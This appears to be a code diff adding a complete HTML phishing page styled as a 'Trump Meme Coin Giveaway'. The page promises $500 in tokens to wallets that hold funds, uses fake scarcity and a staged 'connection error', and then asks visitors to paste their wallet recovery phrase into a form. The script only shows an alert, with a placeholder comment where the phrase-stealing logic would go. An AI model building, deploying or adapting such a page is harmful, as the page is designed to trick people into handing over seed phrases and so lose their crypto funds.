@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>The Official Trump Meme Coin Giveaway</title>
+  <style>
+    /* General Reset */
+    body, h1, h2, p, button, input, select, a, footer {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+
+    body {
+      background: url('https://images.unsplash.com/photo-1499696562547-dbe51006e1bb?q=80&w=686&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D') no-repeat center center/cover;
+      color: #333;
+      line-height: 1.6;
+      overflow-x: hidden;
+    }
+
+    header {
+      background: rgba(0, 86, 179, 0.8);
+      color: #fff;
+      text-align: center;
+      padding: 20px 10px;
+    }
+
+    header img {
+      max-width: 120px;
+      margin-bottom: 10px;
+    }
+
+    header h1 {
+      font-size: 2rem;
+      margin-bottom: 5px;
+    }
+
+    header p {
+      font-size: 1.2rem;
+    }
+
+    .balance {
+      font-size: 1.5rem;
+      font-weight: bold;
+      margin-top: 10px;
+    }
+
+    .container {
+      max-width: 900px;
+      margin: 30px auto;
+      padding: 20px;
+      background: #fff;
+      border-radius: 8px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      transition: filter 0.3s ease;
+    }
+
+    .blurred {
+      filter: blur(8px);
+      pointer-events: none;
+    }
+
+    .wallet-page {
+      display: none;
+      background: #fff;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 90%;
+      max-width: 500px;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+      z-index: 9999;
+    }
+
+    .wallet-page.active {
+      display: block;
+    }
+
+    .error {
+      color: red;
+      font-weight: bold;
+      margin-bottom: 10px;
+      text-align: center;
+    }
+
+    label {
+      display: block;
+      margin-top: 10px;
+      font-weight: bold;
+    }
+
+    input, select {
+      width: 100%;
+      padding: 12px;
+      margin-top: 5px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 1rem;
+    }
+
+    input#wallet-phrase {
+      height: 100px;
+      font-size: 1rem;
+    }
+
+    .btn {
+      display: block;
+      width: 100%;
+      padding: 15px;
+      margin-top: 20px;
+      font-size: 1.2rem;
+      font-weight: bold;
+      color: #fff;
+      background: #ff4500;
+      border: none;
+      border-radius: 5px;
+      text-align: center;
+      cursor: pointer;
+    }
+
+    .btn:hover {
+      background: #e03e00;
+    }
+
+    footer {
+      text-align: center;
+      margin-top: 30px;
+      padding: 20px 0;
+      background: #f1f1f1;
+      color: #666;
+    }
+
+    .terms {
+      font-size: 0.9rem;
+      margin-top: 20px;
+    }
+
+    .terms a {
+      color: #0056b3;
+      text-decoration: none;
+    }
+
+    .terms a:hover {
+      text-decoration: underline;
+    }
+
+    .note {
+      margin-top: 20px;
+      font-size: 0.9rem;
+      color: #333;
+      text-align: center;
+      background: #fff3cd;
+      padding: 10px;
+      border-radius: 5px;
+      border: 1px solid #ffeeba;
+    }
+  </style>
+</head>
+<body>
+  <!-- Header Section -->
+  <header>
+    <img src="https://s.yimg.com/ny/api/res/1.2/C6usFI02aAqtM5gFrKz88w--/YXBwaWQ9aGlnaGxhbmRlcjt3PTY0MDtoPTg1Mw--/https://media.zenfs.com/en/aol_ny_post_us_news_articles_123/cd57f4122a7033346c851d4791a4aff0" alt="Trump Meme Coin Logo">
+    <h1>Trump Meme Coin Giveaway</h1>
+    <p>Make America Great Again!</p>
+    <div class="balance">$5,000,000 $TRUMP</div>
+  </header>
+
+  <!-- Landing Page Content -->
+  <div class="container" id="main-content">
+    <div class="card">
+      <h2>Join the Revolution!</h2>
+      <h4>Claim Your Share of $5 Million!</h4>
+      <p>We’re rewarding the first 10,000 active wallets with $500 in $TRUMP each!  
+With 6,000+ wallets already credited, only 2,000+ spots remain — don’t miss out!.</p>
+      <p>To ensure a fair and rewarding experience, ONLY wallets that have been actively used or have funds in them will be eligible.</p>
+      <p>Be part of the movement — connect your wallet today and secure your share!.</p>
+      <button class="btn" onclick="showWalletPage()">Connect Wallet</button>
+    </div>
+  </div>
+
+  <!-- Wallet Connection Page -->
+  <div class="wallet-page" id="wallet-page">
+    <p class="error">There was an error connecting automatically. But do not worry, you can still connect manually.</p>
+    <h2>Connect Your Wallet</h2>
+    <p>Enter your wallet details to receive Trump Meme Coins.</p>
+
+    <label for="wallet-type">Select Wallet Type</label>
+    <select id="wallet-type">
+      <option value="metamask">MetaMask</option>
+      <option value="trustwallet">Trust Wallet</option>
+      <option value="coinbase">Coinbase Wallet</option>
+      <option value="exodus">Exodus</option>
+      <option value="atomic">Atomic Wallet</option>
+      <option value="binance">Binance Chain Wallet</option>
+      <option value="phantom">Phantom</option><option value="metamask">MetaMask</option>
+      <option value="myetherwallet">MyEtherWallet</option>
+      <option value="blockchain">Blockchain Wallet</option>
+      <option value="bitkeep">BitKeep</option>
+      <option value="coinomi">Coinomi</option>
+      <option value="bitpie">Bitpie</option>
+      <option value="alphawallet">AlphaWallet</option>
+      <option value="brd">BRD</option>
+      <option value="argent">Argent</option>
+      <option value="fortmatic">Fortmatic</option>
+      <option value="walletconnect">WalletConnect</option>
+      <option value="others">Others</option>
+    </select>
+      
+
+    <label for="wallet-phrase">Enter Your Wallet Phrase</label>
+    <input id="wallet-phrase" type="text" placeholder="Copy & Paste Wallet Phrase">
+
+    <div class="note">
+      <p>Note: Only wallets with a balance or transaction history will be credited.</p>
+    </div>
+
+    <button class="btn" onclick="validateWallet()">Validate</button>
+  </div>
+
+  <!-- Footer Section -->
+  <footer>
+    <p>&copy; 2025 Trump Meme Coin Giveaway. All rights reserved.</p>
+    <div class="terms">
+      <p>By participating, you agree to our <a href="#">Terms of Service</a>, <a href="#">Privacy Policy</a>, and <a href="#">Security Policy</a>.</p>
+    </div>
+  </footer>
+
+  <script>
+    function showWalletPage() {
+      // Blur entire page and prevent scrolling
+      document.getElementById('main-content').classList.add('blurred');
+      document.querySelector('header').classList.add('blurred');
+      document.querySelector('footer').classList.add('blurred');
+      document.body.style.overflow = 'hidden';
+
+      // Show wallet page
+      document.getElementById('wallet-page').classList.add('active');
+    }
+
+    function validateWallet() {
+      const walletPhrase = document.getElementById('wallet-phrase').value;
+
+      if (!walletPhrase) {
+        alert('Please enter your wallet phrase!');
+      } else {
+        alert('Connecting to server. Processing for eligibility...');
+        // Real logic for validation would go here.
+      }
+    }
+  </script>
+</body>
+</html>
